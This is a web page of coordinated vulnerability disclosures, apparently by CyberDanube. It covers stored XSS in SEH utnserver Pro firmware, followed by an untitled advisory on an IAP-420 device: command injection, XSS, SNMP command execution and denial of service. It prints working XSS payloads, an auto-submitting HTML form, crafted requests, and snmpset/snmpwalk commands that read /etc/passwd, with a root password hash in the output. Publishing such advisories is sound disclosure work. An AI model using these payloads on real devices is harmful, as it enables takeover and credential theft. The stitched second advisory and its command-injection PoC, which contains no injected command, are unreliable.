# St. PÃ¶lten UAS | Stored Cross-Site Scripting in SEH utnserver Pro

The untserver Pro ist prone to stored cross-site scripting. This allows an attacker to place malicious code in the web interface of the untserver.

## Vendor description

âWe are SEH from Bielefeld â manufacturer of high-quality network solutions. With over 35 years of experience in the fields of printing and networks, we offer our customers a broad and high-level expertise in solutions for all types of business environments.â

Source: https://www.seh-technology.com/us/company/about-us.html

### Vulnerable versions

utnserver Pro / 20.1.22

utnserver ProMAX / 20.1.22

INU-100 / 20.1.22

#### Vulnerability overview

1) Multiple Stored Cross-Site Scripting (CVE-2024-11304)

Different settings on the web interface of the device can be abused to store JavaScript code and execute it in the context of a userâs browser.

#### Proof of Concept

##### 1) Multiple Stored Cross-Site Scripting (CVE-2024-11304)

The following snippet can be used to demonstrate, that stored cross-site scripting is possible in multiple locations on the device:

```
â><script>alert(document.location)</script>
```

Examples are:

* Users password: âusrMg\_pwdâ

  This can be displayed in cleartext and executed in the device configuration.
* Certificate options: âCommon nameâ, âOrganization nameâ, âLocality nameâ

  This can be executed in the certificate information.
* Device description: âHost nameâ, âContact personâ, âDescriptionâ

  This can be executed in âDevice -> Descriptionâ.
* USB password via uploading a crafted â\_parameters.txtâ file: âusbMdg\_pwdâ

  This can be executed in the âMaintenance -> Content Viewâ tab.

Saving this text to the device description leads to a persistent cross-site scripting. Therefore, everyone who openes the device description executes the injected code in the context of the own browser.

The vulnerabilities were manually verified on an emulated device by using the MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

#### Solution

Install firmware version 20.1.35 to fix the vulnerabilities.

#### Workaround

None

#### Recommendation

CyberDanube recommends SEH Computertechnik customers to upgrade the firmware to the latest version available.

---

#### Contact Timeline

* 2024-09-23: Contacting SEH Computertechnik and sent advisory to support. Support answered, that vulnerabilities are fixed in version 20.1.35.
* 2024-10-21: Closed the issue and scheduled publication for November.
* 2024-11-18: Coordinated disclosure of advisory.

### Vulnerable versions

IAP-420 / 2.01e

#### Vulnerability overview

1) Authenticated Command Injection (CVE-2024-55544)

A command injection was identified on the webserver. This vulnerability can only be exploited if a user is authenticated on the web interface. This way, an attacker can invoke commands and is able to get full control over the whole device.

2) Reflected Cross-Site Scripting (CVE-2024-55545)

A reflected cross-site scripting vulnerability is present on the sub page “even\_log.cgi”, which is used to display event logs. It can be exploited in the context of a victim’s session.

3) Stored Cross-Site Scripting (CVE-2024-55546)

A stored cross-site scripting vulnerability has been identified in the firmware of the device. It was identified in the device properties and can be exploited in the context of a victim’s session.

4) Remote Command Execution via SNMP (CVE-2024-55547)

SNMP allows to write the nsExtendObjects. This enables an attacker to execute commands on the operating system of the device.

5) Denial of Service (CVE-2024-55548)

A denial of service (DoS) condition can be reached if a password with more than 16 characters is set in a user account. This is only possible as authenticated user and by disabling the lenght check in the input fields.

#### Proof of Concept

##### 1) Authenticated Command Injection (CVE-2024-55544)

The following GET request creates a file named “test” in the “/tmp” directory.

```
POST /cgi-bin/even_log.cgi HTTP/1.1
Host: 10.69.10.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

h_DI1HtoLLog=&h_DI2HtoLLog=&h_DI3HtoLLog=&h_DI4HtoLLog=
```

This way, the file “/tmp/test” gets created on the filesystem.

##### 2) Reflected Cross-Site Scripting (CVE-2024-55545)

The following payload can be used to trigger a Cross-Site Scripting:
```
"><script >alert(document.cookie)</script >
```
This has been implemented as HTML file as simple Proof-of-Concept:

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>XSS PoC</title>
</head>
<body>
<h1>XSS Proof of Concept</h1>
<form id="xssForm" action="http://10.69.10.2/cgi-bin/even_log.cgi" method="POST">

<input type="hidden" name="h_Eth2LinkDownLog" value="off">
</form>
<script>
document.getElementById('xssForm').submit();
</script>
</body>
</html>
```
##### 3) Stored Cross-Site Scripting (CVE-2024-55546)

Permanent JavaScript code can be stored on the device by abusing certain system settings as shown below:

```
POST /cgi-bin/basic_sysset.cgi HTTP/1.1
Host: 10.69.10.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://10.69.10.3
Connection: keep-alive
Referer: http://10.69.10.3/cgi-bin/basic_sysset.cgi?lang=en
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
tf_devname=%3Cscript%3E%2F*&tf_devlocation=*%2Falert%281%29%3B%2F*&tf_devdes=*%2F%3C%2Fscript%3E&bt_apply=Apply&lang=en&ret_msg=
```

Everytime, when the sub page is loaded, the placed JavaScript code is executed.

##### 4) Remote Command Execution via SNMP (CVE-2024-55547)

Setting the SNMP nsExtendObjects can be done with the command “snmpset”:

```
$ snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c public 10.69.10.3 'nsExtendStatus."evilcommand"' = createAndGo 'nsExtendCommand."evilcommand"' = /bin/cat 'nsExtendArgs."evilcommand"' = '/etc/passwd'
NET-SNMP-EXTEND-MIB::nsExtendStatus."evilcommand" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."evilcommand" = STRING: /bin/cat
NET-SNMP-EXTEND-MIB::nsExtendArgs."evilcommand" = STRING: /etc/passwd
```
Executing the placed command “/bin/cat” can be done with “snmpwalk”, as it

invokes the objects which causes an execution:

```
$ snmpwalk -v2c -c public 10.69.10.3 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."evilcommand" = STRING: /bin/cat
NET-SNMP-EXTEND-MIB::nsExtendArgs."evilcommand" = STRING: /etc/passwd
NET-SNMP-EXTEND-MIB::nsExtendInput."evilcommand" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."evilcommand" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."evilcommand" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."evilcommand" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."evilcommand" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."evilcommand" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."evilcommand" = STRING: root:k6GmNCQYU9ZQU:0:0:Adminstrator:/:/bin/sh
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."evilcommand" = STRING: root:k6GmNCQYU9ZQU:0:0:Adminstrator:/:/bin/sh
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."evilcommand" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."evilcommand" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."evilcommand".1 = STRING: root:k6GmNCQYU9ZQU:0:0:Adminstrator:/:/bin/sh
```
In this case, the file “/etc/passwd” is printed.

##### 5) Denial of Service (CVE-2024-55548)

Disabling the lenght check in the input field enables to set a password longer than 16 characters. By doing so, the device reaches a DoS state and it’s web interface is not usable anymore.

The vulnerabilities were manually verified on an emulated device by using the MEDUSA scalable firmware runtime (<https://medusa.cyberdanube.com>).

#### Solution

None.

#### Workaround

Restrict network access to the device. Restrict access to the management interface.

#### Recommendation

CyberDanube recommends to change the hardware.
